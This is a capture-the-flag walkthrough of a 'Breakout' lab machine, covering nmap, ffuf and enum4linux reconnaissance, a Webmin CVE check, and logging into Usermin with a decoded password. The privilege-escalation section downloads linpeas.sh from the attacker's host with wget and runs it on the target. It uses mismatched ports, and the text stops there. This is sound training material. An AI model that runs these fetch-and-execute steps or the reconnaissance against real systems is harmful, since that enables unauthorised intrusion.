# Summary
- Reconnaisance
- Exploitation
- Escalation

# Reconnaisance
Using this command to get the target ipV4 address 
```
sudo netdiscover -i eth0
```
IMPORTANT : make sure that both `breakout` instance and host instance are on the same network `bridged`
<img width="666" height="18" alt="Screenshot_2025-09-21_23-46-46" src="https://github.com/user-attachments/assets/171ddba2-99ee-41b0-ba11-4cbd5f8b19e2" />

After identifying the target, now I start the tcp scanning process with `nmap`
```
nmap -T4 -vvv -A -O -sV 192.168.0.161
```
Here is the result 
```
PORT      STATE SERVICE     REASON         VERSION
80/tcp    open  http        syn-ack ttl 64 Apache httpd 2.4.51 ((Debian))
|_http-server-header: Apache/2.4.51 (Debian)
|_http-title: Apache2 Debian Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
139/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 4
445/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 4
10000/tcp open  http        syn-ack ttl 64 MiniServ 1.981 (Webmin httpd)
|_http-server-header: MiniServ/1.981
|_http-title: 200 &mdash; Document follows
|_http-favicon: Unknown favicon MD5: 6AF955E4BA91021EF408171FA4542286
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
20000/tcp open  http        syn-ack ttl 64 MiniServ 1.830 (Webmin httpd)
|_http-server-header: MiniServ/1.830
|_http-favicon: Unknown favicon MD5: ACBF9CA6F78B9E12C9D75E14C76CAD5D
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: 200 &mdash; Document follows
MAC Address: 08:00:27:D2:DE:D2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
```
There are a lot of open ports already, but I need to focus on the port `80` first to find hidden files or folders inside the site for further information. The tool for this would be `ffuf`
```
ffuf -c -r -u 'http://192.168.0.161/FUZZ/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

After executing it, I got the fuzzing results right here
```
icons                   [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 18ms]
manual                  [Status: 200, Size: 676, Words: 15, Lines: 14, Duration: 59ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 7ms]
```
So the result indicated that I am able to access the manual folder which is mostly related to documentation of apache and does not contain information that I need so I just assume that I should enumerate other ports like `10000` and `20000` as well so 
I forward my moves to other ports rather than stick my eyes solely on this port and confuse myself.

Moving to port `10000`
<img width="1920" height="217" alt="Screenshot_2025-09-22_00-03-05" src="https://github.com/user-attachments/assets/ab2a4281-ea28-4f2a-b6a3-ab282506993f" />

The link leads me to this site which emphasizes the serivec `https` and that is a loging portal for webmin
<img width="1920" height="643" alt="Screenshot_2025-09-22_00-02-53" src="https://github.com/user-attachments/assets/ba902b9a-9883-4fd6-998b-461e780fcb85" />

Performing a `NSE-script scan with nmap`
Command : `nmap <ip> --script vuln` 
```
PORT      STATE SERVICE
80/tcp    open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.195.130
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.195.130:80/manual/tr/index.html
|     Form id: 
|     Form action: https://www.google.com/search
|     
|     Path: http://192.168.195.130:80/manual/zh-cn/index.html
|     Form id: 
|     Form action: https://www.google.com/search
|     
|     Path: http://192.168.195.130:80/manual/ru/index.html
|     Form id: 
|     Form action: https://www.google.com/search
|     
|     Path: http://192.168.195.130:80/manual/fr/index.html
|     Form id: 
|     Form action: https://www.google.com/search
|     
|     Path: http://192.168.195.130:80/manual/ja/index.html
|     Form id: 
|     Form action: https://www.google.com/search
|     
|     Path: http://192.168.195.130:80/manual/ko/index.html
|     Form id: 
|     Form action: https://www.google.com/search
|     
|     Path: http://192.168.195.130:80/manual/da/index.html
|     Form id: 
|     Form action: https://www.google.com/search
|     
|     Path: http://192.168.195.130:80/manual/pt-br/index.html
|     Form id: 
|     Form action: https://www.google.com/search
|     
|     Path: http://192.168.195.130:80/manual/es/index.html
|     Form id: 
|     Form action: https://www.google.com/search
|     
|     Path: http://192.168.195.130:80/manual/en/index.html
|     Form id: 
|     Form action: https://www.google.com/search
|     
|     Path: http://192.168.195.130:80/manual/de/index.html
|     Form id: 
|_    Form action: https://www.google.com/search
| http-enum: 
|_  /manual/: Potentially interesting folder
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
10000/tcp open  snet-sensor-mgmt
| http-vuln-cve2006-3392: 
|   VULNERABLE:
|   Webmin File Disclosure
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2006-3392
|       Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
|       This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
|       to bypass the removal of "../" directory traversal sequences.
|       
|     Disclosure date: 2006-06-29
|     References:
|       http://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3392
|_      http://www.exploit-db.com/exploits/1997/
20000/tcp open  dnp
MAC Address: 00:0C:29:F0:13:C2 (VMware)
```
The scan indicates that the system is vulnerable to File Disclosure vulnerability with the CVE: CVE-2006-3392
-> Then I tried but unfortunately it is not affected by CVE-2006-3392
Enumerate more in the page source of port 80 I found this interesting info
<img width="1649" height="560" alt="Screenshot 2026-02-15 203919" src="https://github.com/user-attachments/assets/391bf88c-cdf7-4dac-8a1a-27fcd9f92f6d" />

After deciphering the decrypted message I got this

<img width="782" height="205" alt="Screenshot 2026-02-15 204246" src="https://github.com/user-attachments/assets/6e2c62c4-65f3-4915-8d9c-dc257cd5c363" />
<img width="760" height="196" alt="Screenshot 2026-02-15 204133" src="https://github.com/user-attachments/assets/3c25c460-4adb-4720-800a-c48df6e31c44" />


Then, I conducted another user enumeration for `139,445` 

`enum4linux -aU <IP>`
<img width="932" height="317" alt="Screenshot 2026-02-15 191937" src="https://github.com/user-attachments/assets/eeee099b-2ef4-4fb1-8fbb-db867570baf0" />


-> try to login with the cred cyber:.2uqPEfj3D<P'a-3 
=> worked on port 20000

## Usermin Overview
Usermin is a web-based interface for webmail, password changing, mail filters, fetchmail and much more

Back to the target, after getting into port 20000
I found that there is a command line interface in the `Login` menu option
<img width="1917" height="623" alt="Screenshot 2026-02-16 001258" src="https://github.com/user-attachments/assets/aee076ea-1db0-449f-b2d5-21a8941ca8a7" />
-> achieve the user flag

# Privilege Escalation
By setting up a listener on my attack machine
```
python3 -m http.server 1234
```

Then on target machine
```
wget http://<IP>:1324/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```







